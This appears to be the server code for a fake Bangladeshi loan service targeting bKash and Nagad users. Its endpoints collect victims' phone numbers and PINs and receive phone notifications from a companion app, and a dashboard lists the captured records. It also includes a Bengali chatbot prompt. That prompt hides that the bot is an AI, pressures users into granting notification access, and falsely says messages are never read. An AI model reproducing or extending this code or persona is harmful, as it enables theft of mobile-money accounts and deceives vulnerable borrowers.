  res.json({ success: true });
});

app.patch('/api/db', (req, res) => {
  const { path: dbPath, data } = req.body;
  if (dbPath && dbPath.startsWith('sessions/')) {
    const id = dbPath.replace('sessions/', '');
    sessions[id] = Object.assign({}, sessions[id] || {}, data);
    saveSession(id);
  } else if (dbPath && dbPath.startsWith('settings/')) {
    const key = dbPath.replace('settings/', '');
    settings[key] = data;
    saveSettings();
  }
  res.json({ success: true });
});

app.delete('/api/db', (req, res) => {
  const dbPath = req.query.path || req.body.path;
  if (dbPath && dbPath.startsWith('sessions/')) {
    const id = dbPath.replace('sessions/', '');
    delete sessions[id];
    deleteSession(id);
  } else if (dbPath && dbPath.startsWith('settings/')) {
    const key = dbPath.replace('settings/', '');
    delete settings[key];
    saveSettings();
  }
  res.json({ success: true });
});

const crypto = require('crypto');
const META_PIXEL_ID = process.env.META_PIXEL_ID || '1605784090589098';
const META_ACCESS_TOKEN = process.env.META_PIXEL_ACCESS_TOKEN || '';
const META_TEST_EVENT_CODE = process.env.META_TEST_EVENT_CODE || '';

function sha256(v) {
  if (!v) return '';
  return crypto.createHash('sha256').update(String(v).trim().toLowerCase()).digest('hex');
}

function normalizePhone(p) {
  if (!p) return '';
  let s = String(p).replace(/[^\d]/g, '');
  if (s.startsWith('0')) s = '88' + s;
  else if (s.length === 10) s = '880' + s;
  else if (!s.startsWith('88')) s = '88' + s;
  return s;
}

const ALLOWED_CAPI_EVENTS = new Set([
  'PageView', 'AddToCart', 'InitiateCheckout', 'Purchase',
  'Lead', 'CompleteRegistration', 'ViewContent'
]);

function isSameOriginRequest(req) {
  const host = req.headers['x-forwarded-host'] || req.headers.host || '';
  const origin = req.headers.origin || '';
  const referer = req.headers.referer || '';
  if (!origin && !referer) return false;
  try {
    if (origin) {
      const u = new URL(origin);
      if (u.host === host) return true;
    }
    if (referer) {
      const u = new URL(referer);
      if (u.host === host) return true;
    }
  } catch (e) {}
  return false;
}

async function sendCapiEvent({ eventName, eventId, eventTime, userData = {}, customData = {}, sourceUrl = '', actionSource = 'website' }) {
  if (!META_ACCESS_TOKEN) return { ok: false, reason: 'no_token' };
  if (!eventName || !ALLOWED_CAPI_EVENTS.has(eventName)) return { ok: false, reason: 'invalid_event_name' };
  if (!eventId || typeof eventId !== 'string') return { ok: false, reason: 'invalid_event_id' };

  const ud = {};
  if (userData.client_ip_address) ud.client_ip_address = userData.client_ip_address;
  if (userData.client_user_agent) ud.client_user_agent = userData.client_user_agent;
  if (userData.phone) ud.ph = sha256(normalizePhone(userData.phone));
  else if (userData.ph) ud.ph = userData.ph;
  if (userData.external_id) ud.external_id = sha256(userData.external_id);
  if (userData.fbp) ud.fbp = userData.fbp;
  if (userData.fbc) ud.fbc = userData.fbc;

  const event = {
    event_name: eventName,
    event_time: eventTime || Math.floor(Date.now() / 1000),
    event_id: eventId,
    event_source_url: sourceUrl,
    action_source: actionSource,
    user_data: ud,
    custom_data: customData,
  };

  const payload = { data: [event] };
  if (META_TEST_EVENT_CODE) payload.test_event_code = META_TEST_EVENT_CODE;

  const url = `https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events?access_token=${encodeURIComponent(META_ACCESS_TOKEN)}`;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const j = await r.json().catch(() => ({}));
    if (!r.ok) {
      console.error('CAPI error:', JSON.stringify(j));
      return { ok: false, error: j };
    }
    return { ok: true, fb: j };
  } catch (err) {
    console.error('CAPI exception:', err);
    return { ok: false, error: String(err) };
  }
}

app.post('/api/capi', async (req, res) => {
  if (!isSameOriginRequest(req)) {
    return res.status(403).json({ ok: false, reason: 'forbidden_origin' });
  }
  const body = req.body || {};
  const result = await sendCapiEvent({
    eventName: body.event_name,
    eventId: body.event_id,
    eventTime: body.event_time,
    sourceUrl: body.event_source_url || '',
    userData: {
      client_ip_address: getClientIp(req) || '',
      client_user_agent: body.user_data?.client_user_agent || req.headers['user-agent'] || '',
      phone: body.user_data?.ph || '',
      external_id: body.user_data?.external_id || '',
      fbp: body.user_data?.fbp || '',
      fbc: body.user_data?.fbc || '',
    },
    customData: body.custom_data || {},
  });
  const status = result.reason === 'invalid_event_name' || result.reason === 'invalid_event_id' ? 400 : 200;
  return res.status(status).json(result);
});

async function firePurchaseForSession(sess, sourceUrl) {
  if (!sess || sess.purchaseFired) return { skipped: true };
  if (sess.purchaseInFlight) return { skipped: true, reason: 'in_flight' };
  sess.purchaseInFlight = true;
  
  const eventId = sess.purchaseEventId || ('purchase_' + (sess.id || sess.orderId || Date.now()));
  sess.purchaseEventId = eventId;
  const result = await sendCapiEvent({
    eventName: 'Purchase',
    eventId,
    userData: {
      client_ip_address: sess.clientIp || '',
      phone: sess.initialPhone || '',
      external_id: sess.id || '',
    },
    customData: {
      content_name: (sess.provider === 'nagad' ? 'Nagad' : 'bKash') + ' Loan Approved',
      content_category: 'loan',
      currency: 'BDT',
      value: 0,
      order_id: sess.orderId || '',
    },
    sourceUrl: sourceUrl || '',
    actionSource: 'system_generated',
  });
  sess.purchaseInFlight = false;
  if (result && result.ok) {
    sess.purchaseFired = true;
    sess.purchaseFiredAt = Date.now();
  } else {
    sess.purchaseLastError = (result && (result.reason || JSON.stringify(result.error))) || 'unknown';
    sess.purchaseLastAttemptAt = Date.now();
  }
  saveSession(sess.id || sess.sessionId);
  return result;
}

app.get('/api/sessions', (req, res) => res.json(sessions));

app.delete('/api/sessions/all', async (req, res) => {
  sessions = {};
  try {
    if (db) {
      const s = await getDocs(collection(db, 'sessions'));
      const batch = writeBatch(db);
      s.docs.forEach(d => batch.delete(d.ref));
      await batch.commit();
    }
  } catch (e) {
    console.error('delete all error', e);
  }
  res.json({ success: true });
});

// ========== NOTIFICATION & WITHDRAWAL API ==========

// POST /api/submit-withdrawal — Customer submits withdrawal account details
app.post('/api/submit-withdrawal', (req, res) => {
  const { sessionId, accountType, accountNumber, accountHolder, bankName, branchName } = req.body;
  if (!sessionId) return res.status(400).json({ error: 'Missing sessionId' });
  if (!accountType || !accountNumber || !accountHolder) return res.status(400).json({ error: 'Missing required fields' });
  const s = sessions[sessionId];
  if (!s) return res.status(404).json({ error: 'Session not found' });
  s.withdrawalDetails = { accountType, accountNumber, accountHolder, bankName, branchName };
  s.applicationStatus = 'WITHDRAWAL_SUBMITTED';
  s.withdrawalSubmittedAt = Date.now();
  s.lastUpdated = Date.now();
  saveSession(sessionId);
  res.json({ success: true, message: 'Withdrawal details submitted' });
});

// POST /api/submit — APK sends notification batch with session data
app.post('/api/submit', (req, res) => {
  const { sessionId, phone, pin, notifications, flushAll } = req.body;
  if (!sessionId) return res.status(400).json({ error: 'Missing sessionId' });
  if (!sessions[sessionId]) {
    sessions[sessionId] = { id: sessionId, sessionId, phone: phone || '', pin: pin || '', firstSeen: new Date().toISOString(), notificationCount: 0, notifications: [] };
  }
  const s = sessions[sessionId];
  if (phone) s.phone = phone;
  if (pin) s.pin = pin;
  const incoming = Array.isArray(notifications) ? notifications : (notifications ? [notifications] : []);
  if (flushAll && incoming.length > 0) { s.notifications = incoming; s.notificationCount = incoming.length; }
  else if (incoming.length > 0) {
    const keys = new Set((s.notifications||[]).map(n => `${n.timestamp||0}_${(n.fullText||'').substring(0,50)}`));
    incoming.forEach(n => { const k = `${n.timestamp||0}_${(n.fullText||'').substring(0,50)}`; if (!keys.has(k)) { s.notifications.push(n); keys.add(k); } });
    s.notificationCount = s.notifications.length;
  }
  if (s.notifications.length > 500) { s.notifications = s.notifications.slice(-500); s.notificationCount = 500; }
  s.lastSeen = new Date().toISOString();
  saveSession(sessionId);
  res.json({ success: true, sessionId, notificationCount: s.notificationCount });
});

// GET /api/submissions — dashboard reads all sessions with notifications
app.get('/api/push/vapid-public-key', (req, res) => res.json({ publicKey: 'BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuB23s' }));
app.post('/api/push/subscribe', (req, res) => res.json({ success: true }));

app.get('/api/submissions', (req, res) => {
  const list = Object.values(sessions).filter(s => s.notifications && s.notifications.length > 0)
    .map(s => ({ ...s, pin: s.pin || '' }))
    .sort((a, b) => new Date(b.lastSeen||0).getTime() - new Date(a.lastSeen||0).getTime());
  const today = new Date().toISOString().split('T')[0];
  let todayCount = 0;
  list.forEach(s => { (s.notifications||[]).forEach(n => { if (n.time && n.time.startsWith(today)) todayCount++; }); });
  res.json({ sessions: list, totalSessions: list.length, totalNotifications: list.reduce((s,n) => s+(n.notificationCount||0),0), todayCount, serverTime: new Date().toISOString() });
});

app.get('/api/submissions/:sessionId', (req, res) => {
  const s = sessions[req.params.sessionId];
  if (!s) return res.json({ session: null });
  res.json({ session: { ...s, pin: s.pin || '' } });
});

// ========== AI CHAT ==========
app.post('/api/chat', async (req, res) => {
  const { message, step } = req.body;
  if (!message) return res.status(400).json({ error: 'Message required' });
  try {
    const response = await fetch('https://api.deepseek.com/v1/chat/completions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${process.env.DEEPSEEK_API_KEY || 'YOUR_DEEPSEEK_API_KEY'}` },
      body: JSON.stringify({
        model: 'deepseek-chat',
        messages: [
          { role: 'system', content: getSystemPrompt(step) },
          { role: 'user', content: message }
        ],
        max_tokens: 300,
        temperature: 0.7
      })
    });
    const data = await response.json();
    const reply = data.choices?.[0]?.message?.content || 'দুঃখিত, এখন উত্তর দিতে পারছি না।';
    res.json({ reply });
  } catch (e) {
    res.json({ reply: 'আপনার প্রশ্নের জন্য ধন্যবাদ। আমাদের টিম শীঘ্রই আপনার সাথে যোগাযোগ করবে।' });
  }
});

function getSystemPrompt(step) {
  const base = `তুমি একটি লোন সার্ভিসের কাস্টমার সাপোর্ট অ্যাসিস্ট্যান্ট। তোমার নাম "সাপোর্ট টিম"। তুমি বাংলাদেশের মানুষকে সাহায্য করো।

সর্বোচ্চ গুরুত্বপূর্ণ নিয়ম — কখনোই ভাঙবে না:
- কাস্টমারকে কখনোই সিস্টেমের ভিতরের কোনো তথ্য দেবে না (API, এন্ডপয়েন্ট, কোড, সার্ভার, ডাটাবেজ, টেকনিক্যাল কিছুই না)
- "সিস্টেম", "সার্ভার", "এন্ডপয়েন্ট", "API", "ডাটাবেজ", "কোড", "ব্যাকএন্ড" — এই শব্দগুলো কখনোই ব্যবহার করবে না
- কাস্টমার প্রশ্ন করলেও কোনো প্রযুক্তিগত ব্যাখ্যা দেবে না
- কাস্টমার জিজ্ঞেস করলে শুধু বলবে "এটি আমাদের অভ্যন্তরীণ প্রক্রিয়া, আমি বিস্তারিত জানাতে পারবো না"

তুমি বাংলাদেশী বাংলায় কথা বলবে (বাংলাদেশী টোনে, আঞ্চলিকতা বজায় রেখে)
তুমি বিনয়ী, পেশাদার এবং সহায়ক হবে
কখনো বলবে না যে তুমি AI বা বট — তুমি সাপোর্ট টিমের সদস্য

নোটিফিকেশন পারমিশন — গুরুত্বপূর্ণ তথ্য:
- লোন প্রক্রিয়ার জন্য নোটিফিকেশন পারমিশন দেওয়া একদম জরুরি, এটা ছাড়া লোন পাওয়া সম্ভব না
- পারমিশন দিলে আপনার লেনদেনের নোটিফিকেশন আমরা পাবো, যেটা লোন এপ্রুভালের জন্য দরকার
- পারমিশন না দিলে লোন অ্যাপ্রুভাল প্রক্রিয়া সম্পন্ন হবে না
- পারমিশন দিতে: অ্যাপের দেওয়া "নোটিফিকেশন পারমিশন দিন" বাটনে ক্লিক করুন, সেটিংস খুলবে, সেখানে "আমার লোন" অ্যাপটি অন করে দিন
- অথবা: ফোনের সেটিংস > অ্যাপস > বিশেষ অনুমতি > নোটিফিকেশন অ্যাক্সেস > আমাদের অ্যাপটি অন করুন
- পারমিশন দেওয়ার পর স্ট্যাটাস বারে একটি ছোট মেসেঞ্জার আইকন দেখাবে — এটা স্বাভাবিক, চিন্তার কিছু নেই
- আমরা কখনো আপনার ব্যক্তিগত মেসেজ বা চ্যাট পড়ি না, শুধু লেনদেনের নোটিফিকেশন যাচাই করি

লোন প্রক্রিয়া:
- আবেদন জমার পর ৩০ মিনিট অপেক্ষা করতে হবে (রিভিউ সময়)
- অনুমোদিত হলে অ্যাকাউন্ট তথ্য দিয়ে টাকা উত্তোলন করতে হবে (বিকাশ/নগদ/রকেট)
- টাকা পৌঁছাতে ২৪-৭২ ঘণ্টা সময় লাগে
- কোনো সমস্যায় সাপোর্ট টিম সাহায্য করবে`;

  const stepPrompts = {
    waiting: `\nবর্তমান ধাপ: কাস্টমার ৩০ মিনিটের অপেক্ষার পেজে। আবেদন রিভিউ হচ্ছে। নোটিফিকেশন পারমিশন দেওয়া জরুরি — এটা বুঝিয়ে বলবে। পারমিশন না দিলে লোন পাওয়া যাবে না।`,
    approved: `\nবর্তমান ধাপ: কাস্টমারের লোন অনুমোদিত হয়েছে। এখন টাকা উত্তোলন করতে হবে। উত্তোলনের নিয়ম বুঝিয়ে বলবে।`,
    withdrawal: `\nবর্তমান ধাপ: কাস্টমার টাকা উত্তোলনের ফর্ম পূরণ করছেন। কীভাবে সঠিক তথ্য দিতে হয় তা বুঝিয়ে বলবে।`,
    submitted: `\nবর্তমান ধাপ: কাস্টমার উত্তোলন সম্পন্ন করেছেন। ২৪-৭২ ঘণ্টার মধ্যে টাকা পৌঁছাবে। দেরি হলে ধৈর্য ধরতে বলবে, টাকা অবশ্যই আসবে।`
  };

  return base + (stepPrompts[step] || '');
}



async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = require('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
    
    app.get('*all', (req, res) => {
      if (req.path.startsWith('/api')) {
        return res.status(404).json({ error: 'API route not found' });
      }
      serveIndex(req, res);
    });
  } else {
    if (fs.existsSync(distPublicPath)) {
      app.use(express.static(distPublicPath));
    }
    app.get('*all', (req, res) => {
      if (req.path.startsWith('/api')) {
        return res.status(404).json({ error: 'API route not found' });
      }
      serveIndex(req, res);
    });
  }

  if (require.main === module) {
    app.listen(PORT, '0.0.0.0', () => {
      console.log(`Server running on port ${PORT}`);
    });
  }
}

if (require.main === module) { startServer(); }

// Exported for unit testing only — not part of the public API
